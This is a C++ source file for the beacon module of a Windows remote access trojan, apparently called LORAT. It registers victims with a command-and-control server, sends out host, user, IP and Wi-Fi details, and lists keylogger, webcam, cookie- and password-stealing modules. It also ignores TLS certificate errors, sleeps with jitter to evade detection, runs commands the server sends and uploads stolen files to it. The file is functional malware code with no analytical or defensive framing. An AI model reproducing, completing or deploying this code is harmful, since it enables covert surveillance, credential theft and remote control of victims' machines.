#include "beacon.h"
#include "config.h"
#include "crypto.h"
#include "utils.h"
#include <winhttp.h>
#include <ctime>
#include <sstream>
#include <unordered_map>
#pragma comment(lib, "winhttp.lib")

#define AES_BLOCK_SIZE 16

namespace Beacon {
    std::unordered_map<std::string, CommandHandler> handlers;
    bool registered = false;

    void RegisterHandler(const std::string& type, CommandHandler handler) {
        handlers[type] = handler;
    }

    static std::string BuildJSON(const std::vector<std::pair<std::string, std::string>>& fields) {
        std::string json = "{";
        for (size_t i = 0; i < fields.size(); i++) {
            if (i > 0) json += ",";
            json += "\"" + fields[i].first + "\":\"" + fields[i].second + "\"";
        }
        json += "}";
        return json;
    }

    static std::string EscapeJSON(const std::string& s) {
        std::string out;
        out.reserve(s.size());
        for (char c : s) {
            switch (c) {
                case '"': out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n"; break;
                case '\r': out += "\\r"; break;
                case '\t': out += "\\t"; break;
                default: out += c;
            }
        }
        return out;
    }

    bool HTTPSPost(const std::string& path, const std::string& body, std::string& response) {
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        std::wstring wHost = Utils::StringToWString(C2_HOST);
        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), C2_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring wPath = Utils::StringToWString(path);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
                                                  NULL, WINHTTP_NO_REFERER,
                                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                  C2_PORT == 443 ? WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (C2_PORT == 443) {
            DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                             SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
        }

        std::wstring headers = L"Content-Type: application/json\r\n";
        if (!Crypto::g_uuid.empty()) {
            std::wstring uuidHeader = L"X-Victim-UUID: " + Utils::StringToWString(Crypto::g_uuid) + L"\r\n";
            headers += uuidHeader;
        }

        BOOL sent = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
                                        (LPVOID)body.c_str(), (DWORD)body.length(),
                                        (DWORD)body.length(), 0);
        if (sent && WinHttpReceiveResponse(hRequest, NULL)) {
            char buf[8192];
            DWORD read = 0;
            while (WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &read) && read > 0) {
                buf[read] = 0;
                response.append(buf, read);
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return sent;
    }

    bool RegisterWithServer() {
        std::string pubKey = Crypto::GetPublicKeyPEM();

        std::vector<std::pair<std::string, std::string>> fields = {
            {"action", "register"},
            {"pubkey", EscapeJSON(pubKey)},
            {"hostname", EscapeJSON(Utils::GetHostname())},
            {"username", EscapeJSON(Utils::GetUsername())},
            {"os", EscapeJSON(Utils::GetOSVersion())}
        };

        std::string response;
        if (!HTTPSPost(C2_BEACON_PATH, BuildJSON(fields), response)) return false;

        size_t uuidPos = response.find("\"uuid\":\"");
        if (uuidPos != std::string::npos) {
            uuidPos += 8;
            size_t uuidEnd = response.find("\"", uuidPos);
            Crypto::g_uuid = response.substr(uuidPos, uuidEnd - uuidPos);
        }

        size_t keyPos = response.find("\"session_key\":\"");
        if (keyPos != std::string::npos) {
            keyPos += 15;
            size_t keyEnd = response.find("\"", keyPos);
            std::string keyB64 = response.substr(keyPos, keyEnd - keyPos);
            Crypto::g_sessionKey = Crypto::Base64Decode(keyB64);
        }

        registered = !Crypto::g_uuid.empty();
        return registered;
    }

    std::string BuildBeaconJSON() {
        std::stringstream ss;
        ss << "{"
            << "\"uuid\":\"" << Crypto::g_uuid << "\","
            << "\"timestamp\":" << time(0) << ","
            << "\"hostname\":\"" << EscapeJSON(Utils::GetHostname()) << "\","
            << "\"username\":\"" << EscapeJSON(Utils::GetUsername()) << "\","
            << "\"os\":\"" << EscapeJSON(Utils::GetOSVersion()) << "\","
            << "\"ip\":\"" << Utils::GetPublicIP() << "\","
            << "\"idle_time\":" << Utils::GetIdleTime() << ","
            << "\"wifi\":\"" << EscapeJSON(Utils::GetWifiSSID()) << "\","
            << "\"modules\":[\"keylogger\",\"screen_rec\",\"webcam\",\"cookie_steal\","
            << "\"pass_steal\",\"live_screen\",\"wifi_info\",\"system_ctrl\"]"
            << "}";
        return ss.str();
    }

    void ParseCommands(const std::string& response) {
        if (response.empty()) return;

        size_t cmdPos = response.find("\"commands\":[");
        if (cmdPos == std::string::npos) {
            // Check for encrypted response format
            cmdPos = response.find("\"data\":\"");
            return;
        }

        cmdPos += 12;
        size_t cmdEnd = response.find("]", cmdPos);
        if (cmdEnd == std::string::npos) return;

        std::string cmdArray = response.substr(cmdPos, cmdEnd - cmdPos);
        size_t pos = 0;

        while ((pos = cmdArray.find("{", pos)) != std::string::npos) {
            size_t end = cmdArray.find("}", pos);
            if (end == std::string::npos) break;
            std::string cmdObj = cmdArray.substr(pos, end - pos + 1);

            Command cmd;
            size_t idPos = cmdObj.find("\"id\":\"");
            if (idPos != std::string::npos) {
                idPos += 6;
                size_t idEnd = cmdObj.find("\"", idPos);
                cmd.id = cmdObj.substr(idPos, idEnd - idPos);
            }

            size_t typePos = cmdObj.find("\"type\":\"");
            if (typePos != std::string::npos) {
                typePos += 8;
                size_t typeEnd = cmdObj.find("\"", typePos);
                cmd.type = cmdObj.substr(typePos, typeEnd - typePos);
            }

            size_t paramsPos = cmdObj.find("\"params\":");
            if (paramsPos != std::string::npos) {
                paramsPos += 9;
                size_t paramsEnd = cmdObj.rfind("}");
                cmd.params = cmdObj.substr(paramsPos, paramsEnd - paramsPos);
            }

            auto it = handlers.find(cmd.type);
            if (it != handlers.end()) {
                it->second(cmd);
            }

            pos = end + 1;
        }
    }

    bool SendBeacon() {
        if (!registered && !RegisterWithServer()) {
            Utils::JitterSleep(BEACON_INTERVAL_MS / 10);
            return false;
        }

        std::string body = BuildBeaconJSON();
        std::vector<BYTE> iv;
        std::vector<BYTE> encrypted = Crypto::AESEncrypt(
            std::vector<BYTE>(body.begin(), body.end()),
            Crypto::g_sessionKey, iv);

        std::vector<std::pair<std::string, std::string>> fields = {
            {"uuid", Crypto::g_uuid},
            {"iv", Crypto::Base64Encode(iv)},
            {"data", Crypto::Base64Encode(encrypted)}
        };

        std::string response;
        if (!HTTPSPost(C2_BEACON_PATH, BuildJSON(fields), response)) return false;

        ParseCommands(response);
        registered = true;
        return true;
    }

    bool UploadFile(const std::string& cmdId, const std::string& filename, const std::vector<BYTE>& data) {
        std::string boundary = "----LORAT" + std::to_string(time(0));

        std::stringstream body;
        body << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"uuid\"\r\n\r\n"
             << Crypto::g_uuid << "\r\n"
             << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"cmd_id\"\r\n\r\n"
             << cmdId << "\r\n"
             << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"filename\"\r\n\r\n"
             << filename << "\r\n"
             << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"data\"; filename=\"" << filename << "\"\r\n"
             << "Content-Type: application/octet-stream\r\n\r\n";
        body.write((char*)data.data(), data.size());
        body << "\r\n--" << boundary << "--\r\n";

        std::string bodyStr = body.str();
        std::string response;

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        std::wstring wHost = Utils::StringToWString(C2_HOST);
        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), C2_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

        std::wstring wPath = Utils::StringToWString(C2_UPLOAD_PATH);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
                                                  NULL, WINHTTP_NO_REFERER,
                                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                  C2_PORT == 443 ? WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring wHeaders = L"Content-Type: multipart/form-data; boundary=" +
                                 Utils::StringToWString(boundary) + L"\r\n";

        WinHttpSendRequest(hRequest, wHeaders.c_str(), (DWORD)wHeaders.length(),
                           (LPVOID)bodyStr.c_str(), (DWORD)bodyStr.length(),
                           (DWORD)bodyStr.length(), 0);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return true;
    }

    void Loop() {
        while (Utils::ShouldExit()) {
            Sleep(1000);
        }

        while (true) {
            if (Utils::ShouldExit()) break;
            SendBeacon();
            Utils::JitterSleep(BEACON_INTERVAL_MS, BEACON_JITTER_MS);
        }
    }
}
